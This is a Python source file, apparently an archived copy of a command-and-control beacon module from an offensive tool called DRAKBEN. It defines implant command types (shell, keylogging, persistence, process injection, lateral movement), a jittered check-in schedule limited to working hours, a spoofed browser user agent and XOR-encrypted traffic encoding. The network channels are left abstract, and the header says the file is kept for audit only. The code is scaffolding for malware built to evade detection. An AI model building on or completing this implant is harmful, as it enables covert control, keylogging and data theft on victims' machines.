# Archived legacy: core/c2_beacon.py
# This file is an archived copy of the original legacy C2 beacon implementation.
# It has been moved to `core/legacy/` to reduce accidental activation risk.

"""
Original legacy `core/c2_beacon.py` content preserved for audit and rollback.
Do NOT execute this file directly. The refactored architecture does not use
the embedded C2 beacon implementation; this file is kept for analysis only.
"""

# (BEGIN ORIGINAL CONTENT)
"""
DRAKBEN - Command & Control Beaconing Infrastructure
DNS/HTTPS tunneling, jitter communication, agent architecture
"""

import asyncio
import aiohttp
import base64
import hashlib
import json
import os
import random
import socket
import struct
import time
import uuid
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Callable, Any, Tuple
from enum import Enum
from datetime import datetime
from abc import ABC, abstractmethod


class BeaconState(Enum):
    """Beacon connection states"""
    INITIALIZING = "initializing"
    CONNECTED = "connected"
    SLEEPING = "sleeping"
    EXECUTING = "executing"
    DISCONNECTED = "disconnected"
    DEAD = "dead"


class CommandType(Enum):
    """C2 command types"""
    SHELL = "shell"
    UPLOAD = "upload"
    DOWNLOAD = "download"
    SCREENSHOT = "screenshot"
    KEYLOG_START = "keylog_start"
    KEYLOG_STOP = "keylog_stop"
    PERSIST = "persist"
    MIGRATE = "migrate"
    INJECT = "inject"
    SLEEP = "sleep"
    EXIT = "exit"
    SOCKS = "socks"
    PORT_FORWARD = "port_forward"
    LATERAL = "lateral"


class ChannelType(Enum):
    """Communication channel types"""
    HTTP = "http"
    HTTPS = "https"
    DNS = "dns"
    ICMP = "icmp"
    SMB = "smb"
    TCP = "tcp"


@dataclass
class BeaconConfig:
    """Beacon configuration"""
    beacon_id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    sleep_time: int = 60  # seconds
    jitter: float = 0.3   # 30% jitter
    max_retries: int = 5
    kill_date: str = ""   # YYYY-MM-DD format
    working_hours: Tuple[int, int] = (9, 17)  # 9 AM to 5 PM
    channels: List[ChannelType] = field(default_factory=lambda: [ChannelType.HTTPS])
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    
    def to_dict(self) -> Dict:
        return {
            "beacon_id": self.beacon_id,
            "sleep_time": self.sleep_time,
            "jitter": self.jitter,
            "max_retries": self.max_retries,
            "kill_date": self.kill_date,
            "working_hours": self.working_hours,
            "channels": [c.value for c in self.channels]
        }


@dataclass
class C2Command:
    """Command from C2 server"""
    command_id: str
    command_type: CommandType
    args: Dict = field(default_factory=dict)
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    
    def to_dict(self) -> Dict:
        return {
            "command_id": self.command_id,
            "command_type": self.command_type.value,
            "args": self.args,
            "timestamp": self.timestamp
        }
    
    @classmethod
    def from_dict(cls, data: Dict) -> "C2Command":
        return cls(
            command_id=data["command_id"],
            command_type=CommandType(data["command_type"]),
            args=data.get("args", {}),
            timestamp=data.get("timestamp", datetime.now().isoformat())
        )


@dataclass
class CommandResult:
    """Result from command execution"""
    command_id: str
    success: bool
    output: str = ""
    error: str = ""
    data: bytes = b""
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    
    def to_dict(self) -> Dict:
        return {
            "command_id": self.command_id,
            "success": self.success,
            "output": self.output,
            "error": self.error,
            "data_size": len(self.data),
            "timestamp": self.timestamp
        }


class CryptoHelper:
    """Encryption/decryption helper"""
    
    def __init__(self, key: bytes = None):
        self.key = key or os.urandom(32)
    
    def encrypt(self, data: bytes) -> bytes:
        """Simple XOR encryption (in production, use AES)"""
        key_len = len(self.key)
        encrypted = bytearray(len(data))
        for i, byte in enumerate(data):
            encrypted[i] = byte ^ self.key[i % key_len]
        return bytes(encrypted)
    
    def decrypt(self, data: bytes) -> bytes:
        """XOR decryption (symmetric)"""
        return self.encrypt(data)  # XOR is symmetric
    
    def encode_data(self, data: Dict) -> str:
        """Encode and encrypt data for transmission"""
        json_data = json.dumps(data).encode()
        encrypted = self.encrypt(json_data)
        return base64.b64encode(encrypted).decode()
    
    def decode_data(self, encoded: str) -> Dict:
        """Decrypt and decode received data"""
        encrypted = base64.b64decode(encoded)
        decrypted = self.decrypt(encrypted)
        return json.loads(decrypted.decode())


class JitterCalculator:
    """Calculates sleep times with jitter"""
    
    @staticmethod
    def calculate(base_time: int, jitter_percent: float) -> float:
        """Calculate sleep time with jitter"""
        if jitter_percent <= 0:
            return float(base_time)
        
        jitter_range = base_time * jitter_percent
        jitter = random.uniform(-jitter_range, jitter_range)
        return max(1.0, base_time + jitter)
    
    @staticmethod
    def should_beacon_now(working_hours: Tuple[int, int]) -> bool:
        """Check if current time is within working hours"""
        current_hour = datetime.now().hour
        start, end = working_hours
        return start <= current_hour < end


class CommunicationChannel(ABC):
    """Abstract base class for C2 communication channels"""
    
    @abstractmethod
    async def send(self, data: bytes) -> bool:
        """Send data to C2"""
        pass
    
    @abstractmethod
    async def receive(self) -> Optional[bytes]:
        """Receive data from C2"""
        pass
    
    @abstractmethod
    async def check_in(self, beacon_info: Dict) -> Optional[C2Command]:
        """Check in with C2 and get commands"""
        pass


# (END ORIGINAL CONTENT)
